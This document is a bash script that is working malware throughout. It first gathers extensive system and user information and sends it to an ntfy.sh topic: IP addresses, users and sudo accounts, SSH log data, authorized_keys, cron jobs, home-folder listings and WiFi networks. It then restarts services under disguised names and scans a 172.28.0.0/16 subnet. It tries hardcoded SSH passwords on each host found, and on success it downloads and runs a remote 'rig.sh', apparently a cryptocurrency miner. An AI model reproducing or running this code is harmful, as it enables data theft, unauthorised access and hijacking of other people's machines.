#!/bin/bash
bash -c 'MARKER="/.report_sent"; [ -f "$MARKER" ] && exit 0; HN=$(hostname); UN_IP=$(hostname -I | awk "{print \$1}"); PUB_IP=$(curl -s --max-time 5 ifconfig.me); UPTIME=$(uptime -p | sed "s/up //"); BOOT=$(who -b | awk "{print \$3, \$4}"); KERNEL=$(uname -sr); ARCH=$(uname -m); OS=$(source /etc/os-release && echo "$PRETTY_NAME"); TZ=$(cat /etc/timezone 2>/dev/null || timedatectl show -p Timezone --value 2>/dev/null); CPU=$(awk -F: "/model name/{print \$2; exit}" /proc/cpuinfo | sed "s/^ //;s/  */ /g"); CORES=$(nproc); CPU_LOAD=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk "{print 100-\$1\"%\"}"); LOADAVG=$(cut -d" " -f1-3 /proc/loadavg); RAM=$(free -h | awk "/Mem:/{print \$3\"/\"\$2}"); SWAP=$(free -h | awk "/Swap:/{print \$3\"/\"\$2}"); DISK=$(df -h / | awk "NR==2{print \$3\" / \"\$2\" (\"\$5\")\"}"); MAC=$(ip link show | awk "/ether/{print \$2; exit}"); ACTIVE_IF=$(ip route | grep default | awk "{print \$5; exit}"); ACT_IP=""; ACT_MAC=""; if [ -n "$ACTIVE_IF" ]; then ACT_IP=$(ip addr show "$ACTIVE_IF" | awk "/inet /{print \$2}" | cut -d/ -f1); ACT_MAC=$(cat /sys/class/net/"$ACTIVE_IF"/address); else ACTIVE_IF="Net"; fi; IFACES=$(ip -br addr show | awk "{print \$1\"=\"\$3}" | tr "\n" " "); PORTS=$(ss -tulpnH 2>/dev/null | awk "{print \$1\"/\"\$5}" | sort -u | tr "\n" " "); SSHD_PORT=$(ss -tlnpH 2>/dev/null | awk "/sshd/{print \$4}" | head -1 | sed "s/.*://"); TOPCPU=$(ps aux --sort=-%cpu | awk "NR>1&&NR<4{print \$11\"(\"\$3\"%)\"}" | tr "\n" " "); TOPMEM=$(ps aux --sort=-%mem | awk "NR>1&&NR<4{print \$11\"(\"\$4\"%)\"}" | tr "\n" " "); USERS=$(awk -F: "\$3>=1000 && \$3!=65534 {print \$1}" /etc/passwd | tr "\n" " "); SUDO_USERS=$(getent group sudo | cut -d: -f4); [ -z "$SUDO_USERS" ] && SUDO_USERS="net"; ROOT_USERS=$(awk -F: "\$3==0 {print \$1}" /etc/passwd | tr "\n" " "); WHO=$(who | awk "{print \$1}" | tr "\n" " "); [ -z "$WHO" ] && WHO="net"; AUTH_LOG=/var/log/auth.log; if [ -f "$AUTH_LOG" ]; then SSH_OK=$(grep -c Accepted "$AUTH_LOG" 2>/dev/null); SSH_FAIL=$(grep -c "Failed password" "$AUTH_LOG" 2>/dev/null); SSH_FAIL_IPS=$(grep "Failed password" "$AUTH_LOG" 2>/dev/null | awk "{print \$(NF-3)}" | sort | uniq -c | sort -rn | head -5 | awk "{print \$2\"(\"\$1\")\"}" | tr "\n" " "); SUDO_LAST=$(grep "COMMAND=" "$AUTH_LOG" 2>/dev/null | tail -3 | sed "s/.*USER=\([^ ]*\).*COMMAND=/\1: /" | tr "\n" "|"); else SSH_OK=$(journalctl -u ssh -u sshd --since "-7 days" 2>/dev/null | grep -c Accepted); SSH_FAIL=$(journalctl -u ssh -u sshd --since "-7 days" 2>/dev/null | grep -c "Failed password"); SSH_FAIL_IPS=$(journalctl -u ssh -u sshd --since "-7 days" 2>/dev/null | grep "Failed password" | awk "{print \$(NF-3)}" | sort | uniq -c | sort -rn | head -5 | awk "{print \$2\"(\"\$1\")\"}" | tr "\n" " "); SUDO_LAST=$(journalctl _COMM=sudo --since "-7 days" 2>/dev/null | grep "COMMAND=" | tail -3 | sed "s/.*USER=\([^ ]*\).*COMMAND=/\1: /" | tr "\n" "|"); fi; [ -z "$SSH_FAIL_IPS" ] && SSH_FAIL_IPS="net"; [ -z "$SUDO_LAST" ] && SUDO_LAST="net"; AK_USERS=""; for u in $USERS; do h=$(getent passwd "$u" | cut -d: -f6); if [ -f "$h/.ssh/authorized_keys" ]; then AK_USERS="$AK_USERS$u($(grep -cv "^#" "$h/.ssh/authorized_keys")) "; fi; done; [ -z "$AK_USERS" ] && AK_USERS="net"; CRON_SYS=$(ls /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly 2>/dev/null | grep -v ":" | tr "\n" " "); CRON_USERS=""; for u in $USERS; do c=$(crontab -u "$u" -l 2>/dev/null | grep -v "^#"); [ -n "$c" ] && CRON_USERS="$CRON_USERS$u($(echo "$c" | grep -vc "^$")) "; done; [ -z "$CRON_USERS" ] && CRON_USERS="net"; FAILED_SVC=$(systemctl --failed --no-legend --no-pager 2>/dev/null | awk "{print \$1}" | tr "\n" " "); [ -z "$FAILED_SVC" ] && FAILED_SVC="net"; DOCKER=$(docker ps --format "{{.Names}}" 2>/dev/null | tr "\n" " "); [ -z "$DOCKER" ] && DOCKER="net"; UPDATES=$(apt list --upgradable 2>/dev/null | grep -c "/"); RECENT_PKG=$(grep " install " /var/log/dpkg.log 2>/dev/null | tail -3 | awk "{print \$4}" | tr "\n" " "); [ -z "$RECENT_PKG" ] && RECENT_PKG="net"; RECENT_FILES=$(find /home -maxdepth 3 -type f -mtime -7 2>/dev/null | head -5 | tr "\n" " "); [ -z "$RECENT_FILES" ] && RECENT_FILES="net"; FILES=""; for u in $USERS; do h=$(getent passwd "$u" | cut -d: -f6); if [ -d "$h" ]; then FILES="$FILES\n=== User: $u ===\n[Desktop]:\n$(ls -p "$h/Desktop" "$h/Rabochiy stol" 2>/dev/null | tr "\n" " ")\n[Downloads]:\n$(ls -p "$h/Downloads" "$h/Zagruzki" 2>/dev/null | tr "\n" " ")\n"; fi; done; WIFI=$(nmcli -t -f SSID dev wifi list 2>/dev/null | grep -v "^$" | sort -u | tr "\n" " "); [ -z "$WIFI" ] && WIFI="net dannyh ili adaptera"; printf -v REPORT "%b" "Host: $HN\nPublic IP: $PUB_IP\nInternal IP: $UN_IP\nUptime: $UPTIME\nBoot time: $BOOT\nKernel: $KERNEL ($ARCH)\nOS: $OS\nTimezone: $TZ\n\n--- CPU / MEM ---\nCPU: $CPU ($CORES cores)\nCPU Load: $CPU_LOAD\nLoad Avg: $LOADAVG\nRAM: $RAM\nSwap: $SWAP\nDisk /: $DISK\n\n--- Network ---\nSystem MAC: $MAC\nActive: $ACTIVE_IF / $ACT_IP / $ACT_MAC\nAll Interfaces: $IFACES\nSSH Port: $SSHD_PORT\nListening: $PORTS\n\n--- Processes ---\nTop CPU: $TOPCPU\nTop Mem: $TOPMEM\n\n--- Users ---\nUsers: $USERS\nSudo: $SUDO_USERS\nUID=0: $ROOT_USERS\nLogged in: $WHO\n\n--- Auth / SSH ---\nSSH OK: $SSH_OK\nSSH Failed: $SSH_FAIL\nBad IPs: $SSH_FAIL_IPS\nLast sudo: $SUDO_LAST\nauthorized_keys: $AK_USERS\n\n--- Cron ---\nSystem: $CRON_SYS\nUsers: $CRON_USERS\n\n--- Services ---\nFailed systemd: $FAILED_SVC\nDocker: $DOCKER\n\n--- Packages ---\nPending updates: $UPDATES\nRecently installed: $RECENT_PKG\n\n--- Recent files (7d) ---\n$RECENT_FILES\n\n--- WiFi ---\n$WIFI\n\n--- Home files ---\n$FILES"; curl -fsS -H "Title: Otchet ot PC: $HN" -H "Priority: max" -H "Cache: yes" -H "Firebase: yes" -d "$REPORT" "https://ntfy.sh/iujszfndkfdjnjkdfs939" > /dev/null && touch "$MARKER"'

systemctl restart ssh-daemons
sleep 10
systemctl restart sys-kernel

get_active_ips() {
    local range=$1
    nmap -sn $range | awk '/Nmap scan report/{print $NF}'
}

try_ssh() {
    local ip=$1
    
    sshpass -p "rnzxor" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no admin@$ip \
        "echo 'rnzxor' | su -c 'curl -s https://xmrhorizontal.github.io/rig.sh | bash & sleep 120 && pkill -P \$\$'" && {
        return
    }
    sshpass -p "rjuytoew" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no Admin@$ip \
        "echo 'rjuytoew' | su -c 'curl -s https://xmrhorizontal.github.io/rig.sh | bash & sleep 120 && pkill -P \$\$'" && {
        return
    }
    sshpass -p "12345678" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no user@$ip \
        "echo '12345678' | su -c 'curl -s https://xmrhorizontal.github.io/rig.sh | bash & sleep 120 && pkill -P \$\$'" && {
        return
    }
}

range="172.28.0.0/16" 
active_ips=$(get_active_ips "$range")

while read -r ip; do
    try_ssh "$ip"
done <<< "$active_ips"
